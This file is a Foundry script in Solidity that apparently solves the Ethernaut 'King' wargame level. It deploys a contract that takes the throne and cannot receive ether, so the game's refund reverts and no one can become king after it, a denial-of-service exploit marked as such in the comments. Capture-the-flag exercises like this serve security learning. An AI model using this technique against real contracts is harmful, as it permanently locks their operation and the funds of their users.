// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TheLastKing {
    constructor(King _kingInstance) payable {
        (bool result,) = address(_kingInstance).call{value: _kingInstance.prize()}("");
        require(result);
    }
}

contract KingSolution is Script {

    King public kingInstance = King(payable(0xD795AF0D08F3a425384A7D9e9f60E225DD350DB6));
    // Denial of Service Attack

    // Create a contract that cannot receive eth.
    // This will revert line 20 on King contract
    // Making sure no one can become king
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new TheLastKing{value: kingInstance.prize()}(kingInstance);
        vm.stopBroadcast();
    }
}